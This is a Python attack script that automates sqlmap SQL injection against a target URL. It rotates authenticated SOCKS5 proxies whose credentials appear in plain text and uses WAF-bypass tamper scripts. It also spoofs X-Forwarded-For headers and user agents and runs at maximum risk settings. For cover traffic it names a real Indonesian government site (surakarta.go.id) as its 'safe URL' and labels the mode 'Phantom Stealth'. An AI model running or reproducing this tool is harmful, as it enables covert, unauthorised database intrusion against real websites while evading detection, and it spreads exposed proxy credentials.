
import subprocess
import random
import os
import sys
import time

# --- CONFIGURATION ---
SQLMAP_PATH = "python sqlmap.py" # Adjusted to current directory
PROXIES = [
    "socks5://oyyvimta:3olvpyzbkfhq@23.95.150.145:6114",
    "socks5://oyyvimta:3olvpyzbkfhq@198.23.239.134:6540",
    "socks5://oyyvimta:3olvpyzbkfhq@107.172.163.27:6543", 
    "socks5://oyyvimta:3olvpyzbkfhq@198.105.121.200:6462",
    "socks5://oyyvimta:3olvpyzbkfhq@64.137.96.74:6641",
    "socks5://oyyvimta:3olvpyzbkfhq@84.247.60.125:6095",
    "socks5://oyyvimta:3olvpyzbkfhq@216.10.27.159:6837",
    "socks5://oyyvimta:3olvpyzbkfhq@23.26.71.145:5628"
]

# Advanced WAF Bypass Options
TAMPER_SCRIPTS = "space2comment,between,randomcase,space2plus" # Effective combination
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

def get_random_header():
    ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    return f"X-Forwarded-For: {ip}" 

def run_sqlmap_auto(target_url):
    print(f"\n[+] Starting sqlmapauto on: {target_url}")
    
    # 1. Select Random Proxy & User-Agent
    proxy = random.choice(PROXIES)
    user_agent = random.choice(USER_AGENTS)
    header = get_random_header()
    
    print(f"[*] Configuration:")
    print(f"    Proxy: {proxy}")
    print(f"    User-Agent: {user_agent}")
    print(f"    WAF Tamper: {TAMPER_SCRIPTS}")
    print(f"    Custom Header: {header}")

    # 2. Construct Command (Phantom Stealth Mode)
    # --flush-session: Bersihkan sampah scan sebelumnya
    # --safe-url: Kunjungi homepage sesekali agar dikira manusia
    # --ignore-redirects: TETAP di target aslinya
    cmd = f"{SQLMAP_PATH} -u \"{target_url}\" " \
          f"--proxy=\"{proxy}\" " \
          f"--tamper=\"{TAMPER_SCRIPTS}\" " \
          f"--level=3 --risk=3 " \
          f"--technique=BEUST " \
          f"--not-string=\"Redirecting\" " \
          f"--ignore-redirects " \
          f"--delay=2 " \
          f"--safe-url=\"https://surakarta.go.id/\" --safe-freq=10 " \
          f"--flush-session --fresh-queries " \
          f"--random-agent --hex " \
          f"--batch --threads=1 --timeout=10" 

    # 3. Execution
    print(f"\n[*] Executing Command:\n{cmd}\n")
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print("\n[!] Scan Interrupted by user.")
    except Exception as e:
        print(f"\n[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python sqlmapauto.py <URL>")
        print("Example: python sqlmapauto.py http://example.com/vuln.php?id=1")
    else:
        target = sys.argv[1]
        run_sqlmap_auto(target)
